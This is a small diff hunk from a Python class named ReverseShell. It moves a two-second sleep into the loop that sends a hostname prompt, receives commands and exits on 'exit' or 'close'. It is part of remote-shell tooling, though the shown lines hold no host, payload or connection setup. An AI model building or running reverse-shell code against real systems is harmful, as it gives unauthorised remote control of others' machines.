@@ -65,8 +65,8 @@ class ReverseShell:
             ReverseShell.__readBuffer, _, _ = select([ReverseShell.__cSoc], [], [], 0)
             prompt = "{}>".format(gethostname())
             ReverseShell.sendStuff("*** Connection Established ***\n")
-            sleep(2)
             while RUNNING.is_set():                
+                sleep(2)
                 ReverseShell.sendStuff(prompt)
                 cmd = ReverseShell.recvStuff()
                 if cmd == "exit" or cmd == "close":
